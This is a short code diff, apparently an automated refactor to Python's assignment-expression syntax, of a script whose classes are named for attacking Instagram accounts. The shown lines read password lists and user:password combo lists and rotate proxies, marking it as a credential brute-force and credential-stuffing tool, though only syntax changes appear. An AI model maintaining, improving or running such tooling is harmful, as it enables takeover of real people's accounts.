@@ -194,8 +194,7 @@ class hacker_instagram_randomUser_passLiest:
 		lst1 = 'qa2z_wsx3ed.crfv4tg8by1hn5ujmi6klo9p'
 		while True:
 			user = str(''.join((random.choice(lst1) for i in range(self.usL))))
-			pess=self.file.readline().split('\n')[0]
-			if pess == '':exit(input('over ..'))
+			if (pess := self.file.readline().split('\n')[0]) == '':exit(input('over ..'))
 			proxylist = []
 			for pro in self.proxy:
 				proxylist.append(pro)
@@ -303,8 +302,7 @@ class hacker_instagram_1Target_passLiest:
 		self.Trts()
 	def Log_user(self):
 		while True:
-			pess=self.file.readline().split('\n')[0]
-			if pess == '':exit(input('over ..'))
+			if (pess := self.file.readline().split('\n')[0]) == '':exit(input('over ..'))
 			proxylist = []
 			for pro in self.proxy:
 				proxylist.append(pro)
@@ -532,8 +530,7 @@ class hacker_instagram_ComboList:
 	def Log_Combo(self):
 		while True:
 			list = self.file.readline().split('\n')[0]
-			user = list.split(':')[0]
-			if user=='':
+			if (user := list.split(':')[0])=='':
 				threading.Thread(target=Exit).start()
 				exit()
 			try:pess = list.split(':')[1]
